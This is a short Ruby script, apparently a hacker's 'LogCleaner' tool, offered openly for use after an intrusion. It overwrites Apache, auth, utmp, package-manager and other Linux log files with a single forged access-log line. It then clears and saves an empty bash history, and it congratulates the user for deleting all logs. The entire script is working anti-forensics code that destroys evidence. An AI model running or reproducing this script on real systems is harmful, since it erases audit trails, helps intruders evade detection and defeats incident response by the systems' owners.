#/usr/bin/ruby -w
print "
 _____                ______ __                   
|     |_.-----.-----.|      |  |.-----.---.-.----.
|       |  _  |  _  ||   ---|  ||  -__|  _  |   _|
|_______|_____|___  ||______|__||_____|___._|__|  
              |_____|                             
"
linuxlog = [

'/etc/httpd/logs/access_log',
'/etc/httpd/logs/access.log',
'/etc/httpd/logs/error_log',
'/etc/httpd/logs/error.log',
'/var/log/apache2/access_log',
'/var/log/apache2/access.log',
'/var/log/apache2/error_log',
'/var/log/apache2/error.log',
'/var/log/apache/access_log',
'/var/log/apache/access.log',
'/var/log/auth.log',
'/var/log/dpkg.log',
'/var/log/faillog',
'/var/log/httpd/access_log',
'/var/www/logs/access.log',
'/var/www/logs/access_log',
'/var/webmin/miniserv.log',
'/var/run/utmp',
'/var/log/yum.log',
'/var/log/xferlog',
'c:/users/baha/Desktop/test/log.txt'
]

linuxlog.each do |log|
	if File.exist?(log) then 
puts "The #{log} log has been changed"
del = %x!echo 194.190.86.119 - frank [10/Oct/2000:13:55:36 -0700] "GET /apache_pb.gif HTTP/1.0" 200 2326 > #{log}!

else 
 puts "The #{log} directry NOt found" 
end

end

puts "SUPERR All log deleted YOU ARE NINJA !!!!"

system("PAUSE >NULL")
system("cls")


print "Clearing The Bash history "
system("history -c && history -w")




